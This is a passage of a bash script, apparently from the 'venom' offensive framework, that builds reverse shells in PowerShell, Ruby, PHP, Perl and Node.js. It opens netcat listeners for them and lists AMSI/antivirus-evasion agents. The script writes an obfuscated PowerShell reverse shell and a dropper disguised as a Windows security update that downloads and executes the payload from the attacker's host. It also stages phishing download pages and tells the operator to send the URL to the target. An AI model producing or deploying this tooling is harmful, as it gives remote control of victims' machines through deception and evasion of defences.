     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     cd $IPATH/templates/
     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
     sed "s|IpAdDr|$lhost|" simple_powershell.ps1 > simple.raw
     sed "s|P0rT|$lport|" simple.raw > final.raw
     rm $IPATH/templates/simple.raw > /dev/null 2>&1
     mv final.raw $IPATH/output/$N4m.ps1 > /dev/null 2>&1
     chmod +x $IPATH/output/$N4m.ps1 > /dev/null 2>&1

     echo "[✔] Building -> simple powershell shell..."
     echo "---"
     echo "- Reverse connection using one-liner powershell (ancii enc)"
     echo "- that uses powershell socket to forward a tcp connection"
     echo "- http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html"
     echo "-"
     echo "- SHELL   : sm=(New-Object Net.Sockets.TCPClient("$lhost",$lport)).GetStream();"
     echo "-           [byte[]]bt=0..65535|%{0};while((i=sm.Read(bt,0,bt.Length)) -ne 0){;"
     echo "-           d=(New-Object Text.ASCIIEncoding).GetString(bt,0,i);st=([text.encoding]"
     echo "-           ::ASCII).GetBytes((iex d 2>&1));sm.Write(st,0,st.Length)}"
     echo "- EXECUTE : press twice in $N4m to execute!"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.ps1" --info --width 300 > /dev/null 2>&1
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "8" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     echo "[✔] Building -> reverse bin/sh shell..."
     echo "---"
     echo "- simple ruby bash shell that uses rsocket"
     echo "- socket programming to build a conection over tcp"
     echo "- http://pwnwiki.io/#!scripting/ruby.md"
     echo "-"
     echo "- SHELL   : ruby -rsocket -e'f=TCPSocket.open('$lhost',$lport).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)'"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "9" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     echo "[✔] Building -> reverse bin/sh shell..."
     echo "---"
     echo "- simple ruby bash shell that uses rsocket"
     echo "- socket programming to build a conection over tcp"
     echo "- http://pwnwiki.io/#!scripting/ruby.md"
     echo "-"
     echo "- SHELL   : ruby -rsocket -e 'c=TCPSocket.new(\"$lhost\",\"$lport\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "10" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     echo "[✔] Building -> simple php reverse shell..."
     echo "---"
     echo "- simple php reverse shell that uses socket programming"
     echo "- and bash (to execute) to forward a tcp connection"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : php -r 'sock=fsockopen('$lhost',$lport);exec('/bin/sh -i <&3 >&3 2>&3');'"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "11" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     cd $IPATH/templates/
     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
     sed "s|IpAdDr|$lhost|" perl-reverse-shell.pl > simple.raw
     sed "s|P0rT|$lport|" simple.raw > final.raw
     rm $IPATH/templates/simple.raw > /dev/null 2>&1
     mv final.raw $IPATH/output/$N4m.pl > /dev/null 2>&1
     chmod +x $IPATH/output/$N4m.pl > /dev/null 2>&1

     echo "[✔] Building -> perl reverse shell..."
     echo "---"
     echo "- Reverse connect using one-liner perl shell"
     echo "- that uses bash and socket to forward a tcp connection"
     echo "- http://pentestmonkey.net/tools/web-shells/perl-reverse-shell"
     echo "-"
     echo "- SHELL : perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,"
     echo "-         getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open"
     echo "-         (STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
     echo "- NETCAT: sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     gedit $IPATH/output/$N4m.pl & xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.pl" --info --width 300 > /dev/null 2>&1
     sleep 2


   elif [ "$InSh3ll" = "12" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
     echo "require('chield_process').exec('bash -i >& /dev/tcp/$lhost/$lport 0>1');" > $IPATH/output/$N4m.js
     chmod +x $IPATH/output/$N4m.js > /dev/null 2>&1

     echo "[✔] Building -> node.js reverse shell..."
     echo "---"
     echo "- Reverse connect using one-liner javascript shell"
     echo "- that uses bash and socket to forward a tcp connection"
     echo "-"
     echo "- SHELL : require('chield_process').exec('bash -i >& /dev/tcp/$lhost/$lport 0>1');"
     echo "- NETCAT: sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.js" --info --width 300 > /dev/null 2>&1
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "M" ] || [ "$InSh3ll" = "m" ]; then
     echo "${YellowF}[!]${white} return to previous menu .."${Reset};
     sleep 2 && sh_menu


   else


     echo "${RedF}[x]${white} Abort module execution .."${Reset};
     sleep 2
     clear
   fi

else
  echo "${RedF}[x]${white} Abort module execution .."${Reset};
  sleep 2
  clear
fi
}





# ------------------------------------
# exit venom framework
# ------------------------------------
sh_exit () {


# arno0x0x av obfuscation
if [ "$Chts" = "ON" ]; then
  if [ -e "$IPATH/obfuscate/meterpreter_loader.rb" ]; then
    # backup msf modules
    echo "[✔] arno0x0x meterpreter loader random bytes stager: revert .."
    echo "[☠] Revert default msf modules .."
    sleep 1
    cp $IPATH/obfuscate/meterpreter_loader.rb $ArNo/meterpreter_loader.rb
    cp $IPATH/obfuscate/meterpreter_loader_64.rb $ArNo/x64/meterpreter_loader.rb
    rm $IPATH/obfuscate/meterpreter_loader.rb
    rm $IPATH/obfuscate/meterpreter_loader_64.rb
    # reload msfdb
    echo "[☠] Rebuild/Reload msf database .."
    sleep 1
    msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    msfconsole -q -x 'reload_all; exit -y' | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Reload metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  else
    echo "[*] no backup msf modules found.."
    sleep 2
  fi
fi


echo "${BlueF}[☠]${white} Exit Console => Stoping Services."${Reset};
sleep 1
if [ "$DiStR0" = "Kali" ]; then
service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
service apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
else
/etc/init.d/metasploit stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop metasploit" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi

# icmp (ping) shell
if [ "$ICMPDIS" = "disabled" ]; then
  sysctl -w net.ipv4.icmp_echo_ignore_all=0 > /dev/null 2>&1
fi
rm $ApAcHe/$N4m.bat > /dev/null 2>&1
rm $ApAcHe/icmpsh.exe > /dev/null 2>&1
rm $IPATH/templates/hta_attack/index[bak].html > /dev/null 2>&1
cd $IPATH
cd ..
sudo chown -hR $user venom-main > /dev/null 2>&1
echo "${BlueF}[☠]${white} Report-Bugs: https://github.com/r00t-3xp10it/venom/issues"${Reset};
exit
}





## -------------------
# AMSI EVASION MODULES
## -------------------
sh_ninja () {
echo ${BlueF}[${YellowF}i${BlueF}]${white} Loading Amsi ${YellowF}[Evasion]${white} agents ..${Reset};sleep 2
obfstat=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
cat << !


    AGENT Nº1
    ─────────
    DESCRIPTION        : Reverse TCP Powershell Shell
    TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
    LOLBin             : WinHttpRequest (Fileless)
    DROPPER EXTENSION  : PS1|VBS
    AGENT EXTENSION    : PS1
    AGENT PERSISTENCE  : NOT AVAILABLE

    AGENT Nº2
    ─────────
    DESCRIPTION        : Reverse OpenSSL Powershell Shell
    TARGET SYSTEMS     : Windows (8|8.1|10)
    LOLBin             : Powershell (DownloadFile)
    DROPPER EXTENSION  : BAT
    AGENT EXTENSION    : PS1
    AGENT PERSISTENCE  : AVAILABLE

    AGENT Nº3
    ─────────
    DESCRIPTION        : Reverse Powershell Shell (hex|PSrevStr)
    TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
    LOLBin             : bitsadmin (DownloadFile)
    DROPPER EXTENSION  : .CRDOWNLOAD.BAT (MITRE T1036)
    AGENT EXTENSION    : PS1
    AGENT PERSISTENCE  : AVAILABLE

    AGENT Nº4
    ─────────
    DESCRIPTION        : meterpeter Reverse PS Shell (ascii|bxor)
    TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
    LOLBin             : Powershell (DownloadFile)
    DROPPER EXTENSION  : BAT
    AGENT EXTENSION    : PS1
    AGENT PERSISTENCE  : AVAILABLE

    AGENT Nº5
    ─────────
    DESCRIPTION        : Reverse TCP Shell (PDF Trojan)
    TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
    LOLBin             : Powershell|bitsadmin (DownloadFile)
    DROPPER EXTENSION  : EXE|PDF.EXE
    AGENT EXTENSION    : EXE
    AGENT PERSISTENCE  : NOT AVAILABLE

    AGENT Nº6
    ─────────
    DESCRIPTION        : Reverse TCP python Shell (SillyRAT)
    TARGET SYSTEMS     : Multi-Platforms (Linux|Mac|Windows)
    LOLBin             : Powershell|bitsadmin|Wget (DownloadFile)
    DROPPER EXTENSION  : BAT
    AGENT EXTENSION    : PY
    AGENT PERSISTENCE  : AVAILABLE

    AGENT Nº7
    ─────────
    DESCRIPTION        : Reverse OpenSSL Powershell Shell
    TARGET SYSTEMS     : Windows (8|8.1|10)
    LOLBin             : Msxml2.XMLHTTP (FileLess)
    DROPPER EXTENSION  : BAT|HTA
    AGENT EXTENSION    : PS1
    AGENT PERSISTENCE  : NOT AVAILABLE

    AGENT Nº8
    ─────────
    DESCRIPTION        : JPEG Polyglot RCE (OpenSSL)
    TARGET SYSTEMS     : Windows (8|8.1|9|10)
    LOLBin             : Invoke-WebRequest
    DROPPER EXTENSION  : EXE (sfx)
    AGENT EXTENSION    : PS1
    AGENT PERSISTENCE  : redpill cmdlet (%tmp%)

    AGENT Nº9
    ─────────
    DESCRIPTION        : Shepard Bind tcp shell
    TARGET SYSTEMS     : Windows (8|8.1|9|10)
    LOLBin             : Invoke-WebRequest
    DROPPER EXTENSION  : EXE (ps1-To-Exe)
    AGENT EXTENSION    : EXE
    AGENT PERSISTENCE  : redpill cmdlet (%tmp%)

    ╔═════════════════════════════════════════════════════════════╗
    ║   M    - Return to main menu                                ║
    ║   E    - Exit venom Framework                               ║
    ╚═════════════════════════════════════════════════════════════╝


!
echo ${BlueF}[${YellowF}i${BlueF}] "[${YellowF}help 1${BlueF}]${white}detail info"${Reset};sleep 1
echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset};
read choice
case $choice in
1) sh_evasion1 ;;
2) sh_evasion2 ;;
3) sh_evasion3 ;;
4) sh_evasion4 ;;
5) sh_evasion5 ;;
6) vbsevasion="ON";sh_shellcode27 ;;
7) sh_evasion7 ;;
8) sh_evasion8 ;;
9) sh_evasion9 ;;
"help 1") easter1 ;;
"help 2") easter2 ;;
"help 3") easter3 ;;
"help 4") easter4 ;;
"help 5") easter5 ;;
"help 6") easter6 ;;
"help 7") easter7 ;;
"help 8") easter8 ;;
"help 9") easter9 ;;
m|M) sh_menu ;;
e|E) sh_exit ;;
*) echo ${RedF}[x] "[$choice]"${white}: is not a valid Option${Reset}; sleep 2; clear; sh_ninja ;;
esac
}


## TODO: decide if i want this or not
easter1 () {
cat << !

    AGENT Nº   : 1
    OBFUSCATION: $obfstat <= (settings file)
    DESCRIPTION: Reverse TCP Powershell Shell
    OBFUSCATION: If active (ON) creates a VBS dropper insted of PS1
                 This function its used to hidde better the execution
                 of venom dropper on target machine (stealth mode)

!
echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
read odf
clear
sh_ninja
}
easter2 () {
cat << !

    AGENT Nº   : 2
    OBFUSCATION: $obfstat <= (settings file)
    DESCRIPTION: Reverse OpenSSL Powershell Shell
    OBFUSCATION: If active (ON) 'persistence' module creates a VBS insted of BAT startup script.
                 The persistence.vbs script will hidde better is execution. While persistence.bat
                 its written to beacon home from 8 to 8 sec until a valid connection its found.

!
echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
read odf
clear
sh_ninja
}
easter3 () {
cat << !

    AGENT Nº   : 3
    OBFUSCATION: $obfstat <= (settings file)
    DESCRIPTION: Reverse Powershell Shell (hex|PSrevStr obfuscation)
    OBFUSCATION: If active (ON) 'persistence' module creates a VBS insted of BAT startup script.
                 The persistence.vbs script will hidde better is execution. While persistence.bat
                 its written to beacon home from 8 to 8 sec until a valid connection its found.

!
echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
read odf
clear
sh_ninja
}
easter4 () {
cat << !

    AGENT Nº   : 4
    OBFUSCATION: $obfstat <= (settings file)
    DESCRIPTION: meterpeter Reverse PS Shell (ascii|bxor)
    OBFUSCATION: This module does not support easter eggs (directly!)

!
echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
read odf
clear
sh_ninja
}
easter5 () {
cat << !

    AGENT Nº   : 5
    OBFUSCATION: $obfstat <= (settings file)
    DESCRIPTION: Reverse TCP Shell (PDF Trojan)
    OBFUSCATION: If active (ON) dropper.exe its signed for AV evasion using
                 @paranoidninja - CarbonCopy script that signs venom dropper
                 and Client with one SSL certificate(s) (random generation)

!
echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
read odf
clear
sh_ninja
}
easter6 () {
cat << !

    AGENT Nº   : 6
    OBFUSCATION: $obfstat <= (settings file)
    DESCRIPTION: Reverse TCP python Shell (SillyRAT)
    OBFUSCATION: Activated or NOT, (default settings for this categorie)

    In-Windows : This setting obfuscates the BAT dropper to evade AV/amsi detection
                 and emojify to obfuscate Client.py sourcecode to bypass detection.
    In-Linux   : In Linux targets the dropper will fake the installation of the
                 input FileName and at the same time executes our reverse python
                 tcp shell in background (in a child process detach from parent).
    In-Mac     : In Apple devices its the pure python reverse tcp python shell 
                 that needs to be manual deliver to target and manual executed.

!
echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
read odf
clear
sh_ninja
}
easter7 () {
cat << !

    AGENT Nº   : 7
    OBFUSCATION: $obfstat <= (settings file)
    DESCRIPTION: Reverse TCP Powershell Shell (OpenSSL - FileLess)
    OBFUSCATION: If active (ON) dropper.hta script will be created insted of the obfuscated
                 Batch dropper.bat (default). The dropper.hta will fake the install of Netflix
                 from play.google.com/store before executing our Agent in RAM (FileLess).

!
echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
read odf
clear
sh_ninja
}
easter8 () {
cat << !

    AGENT Nº   : 8
    OBFUSCATION: $obfstat <= (settings file)
    DESCRIPTION: JPEG Polyglot RCE (OpenSSL)
    DESCRIPTION: This module ask's attacker to input a legit image.jpeg to
                 be embbebed with our reverse tcp shell (client.ps1), then
                 it compresses image.jpeg and add's a cmdline to winrar (sfx)
                 to silent download redpill.ps1 post-exploit auxiliary and to
                 silent download\execute our client in target RAM.
    WIKI       : https://github.com/r00t-3xp10it/venom/blob/master/bin/powerglot/readme.md
    DEPENDENCIE: python3, powerglot.py, winrar (wine)

!
echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
read odf
clear
sh_ninja
}
easter9 () {
cat << !

    AGENT Nº   : 9
    OBFUSCATION: $obfstat <= (settings file)
    DESCRIPTION: Shepard Bind tcp shell
    DESCRIPTION: This module uses Social Engineering to trick target user into beliving he is
                 installing a MicrosoftEdge update while in background downloads the Bind shell
                 and redpill.ps1 post-exploitation auxiliary module then adds a firewall rule
                 to prevent client execution TCP connection warnings. And finally executes the
                 the Bind TCP shell in background. ( The Client beacons home every 30 seconds )
    WIKI       : https://github.com/r00t-3xp10it/venom/blob/master/bin/shepard/README.md
    DEPENDENCIE: python3, Zip

!
echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
read odf
clear
sh_ninja
}



# --------------------------------------------------------
# Reverse TCP Powershell Shell + WinHttpRequest (Fileless)
# --------------------------------------------------------
sh_evasion1 () {
Colors;

## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
echo "---"
echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
echo "- Please Dont test samples on Virus Total or on similar"${Reset};
echo "- online scanners, because that will shorten the payload life."${Reset};
echo "- And in testings also remmenber to stop the windows defender"${Reset};
echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
echo "---"
sleep 2


## Store User Inputs (bash variable declarations)..
easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ] || [ -z "$easter_egg" ]; then
   rpath=$(zenity --title="☠ 'Payload trigger' Upload Path (target dir) ☠" --text "example: tmp\nexample: LocalAppData (*)\nexample: userprofile\\\\\\\Desktop\n\n(*) Recomended Path For 'Payload trigger' Upload.\nRemark: Only PS environment var's accepted!" --entry --width 350) > /dev/null 2>&1
fi


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$NaM" ]; then NaM="Security-Update";fi
if [ -z "$rpath" ]; then rpath="LocalAppData";fi
if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi


## Display final settings to user
if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then ext="vbs";tech="In-Memory"; else ext="ps1";tech="trigger:$rpath"; fi
echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
echo ${BlueF}"---"
cat << !
    LPORT    : $lport
    LHOST    : $lhost
    LOLBin   : WinHttpRequest
    DROPPER  : $IPATH/output/$Drop.$ext
    AGENT    : $IPATH/output/$NaM.ps1
    UPLOADTO : FileLess ($tech)
    SILENT EXECUTION : $easter_egg
!
echo "---"


## BUILD DROPPER (with Get-HotFix -Description - decoy command)
# echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ] || [ -z "$easter_egg" ]; then
   echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
   ## Hidden powershell execution terminal windows
   # DESCRIPTION: dropper.ps1 will write in $env:tmp folder the REAL dropper (KB4524147_4nF7.ps1)
   # then it will execute it in one PS hidden console (to download/execute real payload.ps1 in-memory)..
   echo "<#" > $IPATH/output/$Drop.ps1
   echo "Framework: venom v1.0.17 - shinigami" >> $IPATH/output/$Drop.ps1
   echo "#>" >> $IPATH/output/$Drop.ps1
   echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
   echo "write-host \"Please Be Patience While We Search For Available Updates to \$env:userdomain System\" -ForegroundColor gray -BackgroundColor Black;" >> $IPATH/output/$Drop.ps1
   echo "  \$KBid=Get-HotFix -Description 'Security Update';" >> $IPATH/output/$Drop.ps1
   echo "  \$KBid;\$KBid | Out-File -Encoding utf8 -FilePath 'Recent_OS_Updates.txt' -Force;" >> $IPATH/output/$Drop.ps1
   echo "echo \"\`\$host.UI.RawUI.WindowTitle = \`\"Cumulative Security Update KB4524147\`\";\" > \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
   echo "echo \"   \`\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
   echo "echo \"        \`\$proxy.open('GET','http://$lhost/$NaM.ps1',\`\$false);\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
   echo "echo \"        \`\$proxy.send();\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
   echo "echo \"& ('ie'+'x') \`\$proxy.responseText;\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
   echo "Start-Sleep -Seconds 2;PoWeRsHeLl -W 1 -File \"\$env:$rpath\\KB4524147_4nF7.ps1\"" >> $IPATH/output/$Drop.ps1 
else
   echo "${BlueF}[☠]${white} Building Obfuscated vbs dropper ..${white}";sleep 2
   ## Silent Execution -> OBFUSCATION=ON (none PS terminal window pops up)
   # REMARK: A MessageBox will pop up announcing that are KB updates available.
   echo "Dim domain,x,u" > $IPATH/output/$Drop.vbs
   echo "Set objShell = WScript.CreateObject(\"WScript.Shell\")" >> $IPATH/output/$Drop.vbs
   echo "domain = objShell.ExpandEnvironmentStrings(\"%userdomain%\")" >> $IPATH/output/$Drop.vbs
   echo "x=MsgBox(\"Security updates available.\" & vbCrLf & \"Do you wish to install them now?\",4+48,\"\" & domain & \" - Cumulative Security Update KB4524147\")" >> $IPATH/output/$Drop.vbs
   echo "CreateObject(\"WScript.Shell\").Exec \"powershell -W 1 \$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText;\"" >> $IPATH/output/$Drop.vbs
   echo "u=MsgBox(\"Security Updates Successfully Installed ..\",0+64,\"\" & domain & \" - Cumulative Security Update KB4524147\")" >> $IPATH/output/$Drop.vbs
fi


## Build Reverse Powershell Shell
echo "${BlueF}[☠]${white} Writting TCP reverse shell to output .."${Reset};sleep 2
echo "<#" > $IPATH/output/$NaM.ps1
echo "Obfuscated Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
echo "Framework: venom v1.0.17 (amsi evasion)" >> $IPATH/output/$NaM.ps1
echo "Original shell: @ZHacker13" >> $IPATH/output/$NaM.ps1
echo "#>" >> $IPATH/output/$NaM.ps1
echo "" >> $IPATH/output/$NaM.ps1
echo "\$MethodInvocation = \"gnidocnEiicsA.txeT.metsyS\";\$Constructor = \$MethodInvocation.ToCharArray();[Array]::Reverse(\$Constructor);" >> $IPATH/output/$NaM.ps1
echo "\$NewObjectCommand = (\$Constructor -Join '');\$icmpv6 = \"StreamWriter\";\$assembly = \"tneilCpcT.stekcoS.teN\";" >> $IPATH/output/$NaM.ps1
echo "\$CmdCharArray = \$assembly.ToCharArray();[Array]::Reverse(\$CmdCharArray);\$PSArgException = (\$CmdCharArray -Join '');" >> $IPATH/output/$NaM.ps1
echo "\$socket = new-object \$PSArgException('$lhost', $lport);if(\$socket -eq \$null){exit 1};\$stream = \$socket.GetStream();" >> $IPATH/output/$NaM.ps1
echo "\$writer = new-object System.IO.\$icmpv6(\$stream);\$buffer = new-object System.Byte[] 1024;" >> $IPATH/output/$NaM.ps1
echo "\$comm = new-object \$NewObjectCommand;" >> $IPATH/output/$NaM.ps1
echo "do{" >> $IPATH/output/$NaM.ps1
echo "	\$writer.Write('[' + (hostname) + '] ' + (pwd).Path + '> ');" >> $IPATH/output/$NaM.ps1
echo "	\$writer.Flush();" >> $IPATH/output/$NaM.ps1
echo "	\$read = \$null;" >> $IPATH/output/$NaM.ps1
echo "	while(\$stream.DataAvailable -or (\$read = \$stream.Read(\$buffer, 0, 1024)) -eq \$null){};" >> $IPATH/output/$NaM.ps1
echo "	\$out = \$comm.GetString(\$buffer, 0, \$read).Replace(\"\`r\`n\",\"\").Replace(\"\`n\",\"\");" >> $IPATH/output/$NaM.ps1
echo "	if(!\$out.equals(\"exit\")){" >> $IPATH/output/$NaM.ps1
echo "		\$out = \$out.split(' ')" >> $IPATH/output/$NaM.ps1
echo "	        \$res = [string](&\$out[0] \$out[1..\$out.length]);" >> $IPATH/output/$NaM.ps1
echo "		if(\$res -ne \$null){ \$writer.WriteLine(\$res)};" >> $IPATH/output/$NaM.ps1
echo "	}" >> $IPATH/output/$NaM.ps1
echo "}While (!\$out.equals(\"exit\"))" >> $IPATH/output/$NaM.ps1
echo "\$writer.close();\$socket.close();" >> $IPATH/output/$NaM.ps1


## Building Download webpage
echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" TRUE "Mega-Upload (default)" FALSE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
if [ "$phish" = "Mega-Upload (default)" ]; then
    cd $IPATH/templates/phishing
   sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
   mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
else
   cd $IPATH/templates/phishing/firefox
   sed "s|NaM3|http://$lhost/$Drop.zip|g" FakeUpdate.html > Download.html
   mv Download.html $ApAcHe/Download.html > /dev/nul 2>&1
   cp -r FakeUpdate_files $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
fi
cd $IPATH


cd $IPATH/output
## Copy files to apache2 webroot
echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
zip $Drop.zip $Drop.$ext > /dev/nul 2>&1
cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
cp $IPATH/aux/webserver.ps1 $ApAcHe/webserver.ps1 > /dev/nul 2>&1
cd $IPATH


## Print attack vector on terminal
echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
echo "${BlueF}---"
echo "${BlueF}- ${RedBg}SEND THE URL GENERATED TO TARGET HOST${Reset}"
if [ "$phish" = "Mega-Upload (default)" ]; then
   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/MegaUpload.html"
else
   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/Download.html"
fi
echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
